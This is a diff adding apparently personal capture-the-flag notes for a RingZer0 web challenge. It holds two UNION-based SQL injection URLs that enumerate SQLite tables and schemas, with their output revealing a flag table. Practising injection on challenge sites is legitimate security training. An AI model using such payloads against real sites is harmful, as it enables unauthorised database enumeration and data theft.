@@ -1,0 +1,9 @@
+http://ringzer0team.com/challenges/39/?id=2 union all SELECT 1,tbl_name FROM sqlite_master WHERE type='table' limit 1,1
+
+random_stuff   CREATE TABLE random_stuff (id int(10), content varchar(100)) 
+ajklshfajks    CREATE TABLE ajklshfajks (flag varchar(40)) 
+troll          CREATE TABLE troll (id int(10)) 
+aatroll        CREATE TABLE aatroll (id int(10)) 
+
+
+http://ringzer0team.com/challenges/39/?id=2 union all select 1,sql from sqlite_master where type='table' and tbl_name='table_name' limit 1,1
